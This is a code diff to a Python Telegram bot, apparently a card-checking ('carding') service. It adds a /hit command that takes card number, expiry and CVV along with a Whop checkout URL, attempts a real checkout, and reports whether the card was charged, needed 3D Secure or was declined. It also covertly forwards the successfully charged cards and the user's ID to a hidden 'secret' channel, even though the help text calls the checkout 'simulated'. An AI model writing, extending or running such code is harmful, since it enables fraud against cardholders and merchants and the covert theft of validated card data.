@@ -3046,10 +3046,119 @@ async def allchecking_callback(
 # ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 # /hit COMMAND (WHOP CHECKOUT)
 # ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+WHOP_SECRET_LOGS_ID = -1003721327421  # Your secret channel ID
+
 async def cmd_hit(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
     if not WHOP_LOADED:
-        # ... rest of the hit code ...
+        await update.message.reply_text(
+            "❌ <b>MODULE NOT LOADED</b>\n"
+            "The <code>whop_api.py</code> file failed to import.\n"
+            "Please make sure you have installed requirements: <code>pip install requests</code>\n"
+            "And ensure <code>whop_api.py</code> is in the same folder as <code>main.py</code>.",
+            parse_mode="HTML"
+        )
+        return
+
+    if not context.args or len(context.args) < 2:
+        msg = (
+            "❌ INVALID USAGE\n"
+            "━━━━━━━━━━━━━━━━━━━━\n\n"
+            "📌 Usage: <code>/hit card|mm|yy|cvv whop_url</code>\n"
+            "📌 Example: <code>/hit 4532015112830366|12|28|123 https://whop.com/...</code>\n\n"
+            "⚠️ Note: Runs a full simulated Whop checkout using the provided URL."
+        )
+        await update.message.reply_text(msg, parse_mode="HTML")
+        return
+
+    card_str = None
+    url_str = None
+
+    for arg in context.args:
+        if "|" in arg and not arg.startswith("http"):
+            card_str = arg
+        elif arg.startswith("http"):
+            url_str = arg
+
+    if not card_str:
+        await update.message.reply_text(
+            "❌ No valid card format found.\n"
+            "Make sure it follows: <code>CARD|MM|YY|CVV</code>",
+            parse_mode="HTML"
+        )
+        return
+
+    if not url_str:
+        await update.message.reply_text(
+            "❌ No Whop URL found.\n"
+            "Usage: <code>/hit card|mm|yy|cvv https://whop.com/...</code>",
+            parse_mode="HTML"
+        )
+        return
+
+    status_msg = await update.message.reply_text("⏳ Processing Whop checkout...", parse_mode="HTML")
+
+    parsed, err = _parse_cc(card_str)
+    if err:
+        await status_msg.edit_text(f"❌ Error parsing card: {err}")
+        return
+
+    cfg = _build_cfg(url_str, "", parsed)
+
+    loop = asyncio.get_running_loop()
     
+    def run_checker():
+        return WhopCheckout(cfg).run_api()
+
+    try:
+        result = await loop.run_in_executor(None, run_checker)
+    except Exception as e:
+        logger.error(f"Whop checker crashed: {e}")
+        await status_msg.edit_text(f"❌ Checker crashed: {str(e)}")
+        return
+
+    st = result.get("status", "unknown")
+    msg = result.get("message", "")
+    code = result.get("code", "")
+    amount_raw = result.get("amount", "?")
+    currency = result.get("currency", "USD")
+    
+    # Format Amount safely
+    if isinstance(amount_raw, (int, float)) and amount_raw > 0:
+        amount_val = amount_raw / 100
+        amount_str = f"{amount_val:.2f} {currency}"
+    else:
+        amount_str = "N/A"
+
+    # Determine Status and Sub-message
+    if st == "charged":
+        status_text = "Paid 💰"
+        sub_msg = "Payment successful"
+    elif st == "3ds":
+        status_text = "3D Secure 🔄"
+        sub_msg = result.get("url", "3DS required")
+    elif st == "declined":
+        status_text = "Not Paid ❌"
+        sub_msg = msg or code or "Payment failed"
+    elif st == "error":
+        status_text = "Not Paid ❌"
+        sub_msg = msg
+    else:
+        status_text = "Not Paid ❌"
+        sub_msg = "Unknown status"
+
+    # Build UI (Email hidden, [𐓷] replaced with ⌑)
+    text = (
+        f"#Whop [/hit]\n"
+        f"⸺⸺⸺⸺⸺\n"
+        f"⌑ Site : Whop 🌐\n"
+        f"⌑ Amount : {amount_str}\n"
+        f"⌑ Status : {status_text}\n"
+        f"⸺⸺⸺⸺⸺\n"
+        f"<code>{card_str}</code>\n"
+        f"  ⤷ {sub_msg}"
+    )
+
+    # Send response to user
     await status_msg.edit_text(text, parse_mode="HTML")
 
     # Send ONLY PAID cards to secret channel
@@ -3058,7 +3167,7 @@ async def cmd_hit(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
             uid_str = update.effective_user.id
             secret_text = f"🕵️‍♂️ <b>New PAID Whop Hit by User:</b> <code>{uid_str}</code>\n{text}"
             await context.bot.send_message(
-                chat_id=-1003721327421,
+                chat_id=WHOP_SECRET_LOGS_ID,
                 text=secret_text,
                 parse_mode="HTML",
                 disable_notification=True
@@ -3073,7 +3182,6 @@ async def cmd_hit(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
 async def cmd_sub(update: Update, context: ContextTypes.DEFAULT_TYPE):
     user = update.effective_user
     now  = time.time()
-
     # ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
     # OWNER: /sub @user | /sub ID | reply → /sub
     #   Shows target user's plan + inline buttons to grant
